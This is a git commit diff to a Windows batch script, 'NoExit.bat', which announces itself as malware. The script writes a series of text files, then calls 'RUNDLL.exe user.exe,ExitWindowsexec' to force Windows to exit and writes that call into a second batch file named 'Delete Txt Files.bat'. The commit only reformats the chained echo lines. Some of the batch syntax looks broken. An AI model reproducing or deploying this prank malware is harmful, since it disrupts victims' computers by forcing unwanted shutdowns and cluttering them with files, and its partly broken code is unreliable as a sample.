ef7a8773c9614736f77b45dce1c01bc03344fb9c
Matthew <mcissell5115@gmail.com>
2025-07-23 15:06:03 -0500

    Update NoExit.bat

--- NoExit.bat
+++ NoExit.bat
@@ -2,5 +2,8 @@
 echo This is no Joke! do you wish to run this Malware? pause
 echo No exit.bat >> "N.txt"
 echo No exit.bat >> "No.txt"
-echo No exit.bat >> "No E.txt" echo No exit.bat >> "No Ex.txt" echo No exit.bat >> "No Exi.txt" echo No exit.bat >> "No Exit.txt"
+echo No exit.bat >> "No E.txt"
+echo No exit.bat >> "No Ex.txt"
+echo No exit.bat >> "No Exi.txt"
+echo No exit.bat >> "No Exit.txt"
 echo RUNDLL.exe user.exe, ExitWindowsexec >> "Delete Txt Files.bat" RUNDLL.exe user.exe,ExitWindowsexec
